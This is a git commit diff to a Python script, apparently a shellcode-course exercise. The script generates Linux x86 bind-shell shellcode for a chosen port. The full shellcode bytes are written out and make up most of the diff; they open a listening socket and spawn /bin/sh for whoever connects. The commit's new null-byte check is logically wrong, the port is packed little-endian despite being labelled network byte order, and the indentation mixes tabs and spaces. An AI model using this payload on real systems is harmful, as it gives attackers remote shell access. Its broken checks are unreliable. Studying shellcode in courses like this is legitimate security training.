fd469c86340a36d7ee05e9a5e4d39ab0c00cd5d5
arch3y <arch3y@archstrike.org>
2018-01-14 23:45:59 -0500

    added in check for nulls in port numnber

--- SLAE1-BindShell/bind_shell.py
+++ SLAE1-BindShell/bind_shell.py
@@ -7,7 +7,7 @@ from sys import exit
 import argparse
 import struct
 import binascii
-import ctypes
+import re
 
 def validateport(port):
 	if port < 1 or port > 65535:
@@ -17,17 +17,21 @@ def validateport(port):
 		return True
 
 def convertport(port):
-	p = binascii.hexlify(struct.pack('<h', port)) # convert string port to little endian short format and then hex it to get the opcodes
-	#for i in p:
-	#    c = int(i)
-	#    if :
-	#	print "crap"
-	p = "\\x%s\\x%s" % (str(p[0:2]), str(p[2:]))
-	return p
+    p = binascii.hexlify(struct.pack('<h', port)) # convert string port to little endian short format and then hex it to get the opcodes
+    if p[0:2] or p[2:] == "00":
+        print("Port contains null bytes")
+        print("We are fucked")
+    p = "\\x%s\\x%s" % (str(p[0:2]), str(p[2:]))
+    return p
 
 def buildshellcode(hexport):
-	sc="\\x31\\xc0\\x31\\xdb\\x31\\xff\\x31\\xc9\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xdb\\x53\\x66\\x68" + hexport + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\xb0\\x66\\xb3\\x02\\x89\\xe1\\xcd\\x80\\x6a\\x01\\x52\\xb0\\x66\\x80\\xc3\\x02\\x89\\xe1\\xcd\\x80\\x57\\x57\\x52\\xb0\\x66\\xfe\\xc3\\x89\\xe1\\xcd\\x80\\x89\\xd1\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xff\\x57\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x57\\x89\\xe2\\x57\\x89\\xe1\\xcd\\x80"
-	return sc
+        sc = ("\\x31\\xc0\\x31\\xdb\\x31\\xff\\x31\\xc9\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80"+
+        "\\x89\\xc2\\x31\\xdb\\x53\\x66\\x68"+hexport+"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\xb0\\x66\\xb3\\x02"+
+        "\\x89\\xe1\\xcd\\x80\\x6a\\x01\\x52\\xb0\\x66\\x80\\xc3\\x02\\x89\\xe1\\xcd\\x80"+
+        "\\x57\\x57\\x52\\xb0\\x66\\xfe\\xc3\\x89\\xe1\\xcd\\x80\\x89\\xd1\\x89\\xc3\\xb0"+
+        "\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xff\\x57\\xb0\\x0b\\x68\\x2f"+
+        "\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x57\\x89\\xe2\\x57\\x89\\xe1\\xcd\\x80")
+        return sc
 
 def main():
 	parser = argparse.ArgumentParser(description="Customize bind shellcode with port of your choosing")
@@ -41,7 +45,7 @@ def main():
 
 	print("Port: %d" % args.port)
 	print("Port number in network byte order: %s" % hexport)
-	print("Shellcode Length: %s" % len(shellcode))
+	print("Shellcode Length: %d" % len(shellcode))
 	print("Shellcode\n")
 	print('"' + shellcode + ';"')
 
